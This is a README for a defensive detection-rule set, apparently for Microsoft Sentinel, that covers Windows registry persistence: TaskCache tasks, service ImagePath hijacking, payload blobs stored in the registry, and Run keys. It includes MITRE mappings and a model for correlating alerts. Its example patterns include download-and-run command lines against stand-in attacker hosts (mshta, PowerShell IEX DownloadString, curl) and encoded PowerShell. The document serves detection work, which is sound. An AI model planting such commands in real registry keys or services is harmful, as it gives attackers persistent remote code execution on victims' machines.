# Registry Persistence & Payload Stashing Ecosystem (Composite L2)

This folder contains a **Composite Cousin Ecosystem** for one of the most abused persistence surfaces in Windows:

> **Registry-based persistence + service hijacking + payload stashing**

Attackers use the registry because it provides:

- stealthy persistence
- execution without dropping new binaries
- service-level privilege escalation
- long-lived footholds

This ecosystem is built under the **Minimum Truth + Reinforcement** framework:

- Registry writes are the **truth anchor**
- Cousin rules confirm attacker intent
- Scoring + prevalence suppress noise
- No monolithic kill-chain logic

---

## Ecosystem Overview

Modern persistence chains frequently converge on registry modification:

```text
TaskCache writes → Silent Scheduled Task persistence
Service ImagePath hijack → SYSTEM execution
Run keys → Userland autoruns
Large registry blobs → Payload stashing / staging
```

This folder operationalises these behaviours as **cousin-confirming sensors**.

---

## Included Detection Cousins

| Rule Category | Behaviour Confirmed | Example Outcome |
|--------------|---------------------|----------------|
| **TaskCache Persistence** | Silent scheduled task persistence | High-confidence foothold |
| **Service ImagePath Hijack** | Service execution redirection | SYSTEM persistence |
| **Registry Payload Stash** | Blob-based payload staging | Malware hiding |
| **Autoruns / Run Keys** | Userland startup execution | Background persistence |
| **Security Provider Hijack** | Deep OS interception | Credential theft + stealth |

Each rule is a **sensor**, not a kill-chain monolith.

---

## Rule Class 1 — TaskCache Silent Persistence

### Attacker Intent

Attackers abuse the TaskCache registry structure to persist without obvious task creation events:

```text
HKLM\...\Schedule\TaskCache\Tasks\{GUID}
HKLM\...\Schedule\TaskCache\Tree\...
```

This often bypasses naïve Scheduled Task monitoring.

### Malicious Patterns

```text
Encoded payloads stored in TaskCache blobs
COM/API task registration without schtasks.exe
Persistence written silently under SYSTEM
```

### MITRE Mapping

- **T1053.005** — Scheduled Task/Job
- **T1546.003** — Event Triggered Execution
- **TA0003** — Persistence

---

## Rule Class 2 — Service ImagePath Hijacking

### Attacker Intent

Attackers persist as SYSTEM by modifying service execution paths:

```text
HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath
```

This allows execution of malware at boot/service start.

### Malicious Commandline Examples

```text
C:\Users\Public\evil.exe
mshta.exe http://attacker/payload.hta
powershell.exe -enc <base64>
rundll32.exe javascript:...
```

### Why This Matters

Service persistence is one of the most reliable attacker footholds:

- survives reboot
- executes as SYSTEM
- blends into legitimate service noise

### MITRE Mapping

- **T1543.003** — Windows Service
- **T1574.011** — Search Order Hijacking (contextual)
- **TA0003** — Persistence

---

## Rule Class 3 — Registry Payload Stashing (Large Blobs)

### Attacker Intent

Attackers increasingly store payloads inside registry values to avoid disk-based detection:

```text
Large Base64 blobs
Encrypted staging inside TaskCache or Run keys
Fileless payload recovery at execution time
```

### Example Tradecraft

```text
RegistryValueData = TVqQAAMAAAAEAAAA...
Registry used as malware storage container
Second-stage loader retrieves blob later
```

### MITRE Mapping

- **T1027** — Obfuscated/Encrypted Payloads
- **T1112** — Modify Registry
- **TA0005** — Defense Evasion

---

## Rule Class 4 — Autoruns / Run Key Persistence

### Attacker Intent

Userland persistence through startup execution:

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### Common Malicious Patterns

```text
powershell -c IEX(New-Object Net.WebClient).DownloadString(...)
cmd.exe /c curl http://...
rundll32.exe <dll>,<export>
```

### MITRE Mapping

- **T1547.001** — Registry Run Keys / Startup Folder
- **TA0003** — Persistence

---

## Cousin Confirmation Model

Registry persistence is rarely one isolated signal.

This ecosystem escalates when cousins converge:

```text
TaskCache write truth
        +
Service ImagePath hijack cousin
        +
Payload blob staging cousin
        =
Confirmed Persistence Capability (High Confidence)
```

This is exactly how your framework avoids alert fatigue:

- single registry write = suspicious
- multi-cousin convergence = attacker foothold confirmed

---

## Stress Testing & Validation

These composites were validated using:

- ADX-Docker synthetic registry telemetry harness
- Empire-style persistence simulations
- Large-blob + service hijack test cases

The goal is not “catch everything.”

The goal is:

> High-fidelity persistence truth that survives enterprise noise

---

## Sentinel Operational Deployment

Recommended production deployment pattern:

- Deploy each cousin as a scheduled analytic rule
- Output into a unified detection stream
- Correlate persistence escalation externally:

```text
If TaskCache + ServiceHijack within 24h → Create Incident
If BlobStash + Autorun within 6h → Escalate Severity
```

No monolithic kill-chain queries required.

---

## Why This Ecosystem Matters

Registry persistence remains one of the most abused attacker surfaces because it enables:

- stealth
- reboot survival
- SYSTEM-level footholds
- payload hiding without files

This ecosystem provides:

- persistence truth anchors
- cousin reinforcement
- prevalence-aware scoring
- SOC-ready directives

---

## Author

**Ala Dabat**  
Composite Threat Hunting Framework  
Minimum Truth Detection Engineering (2026)

---
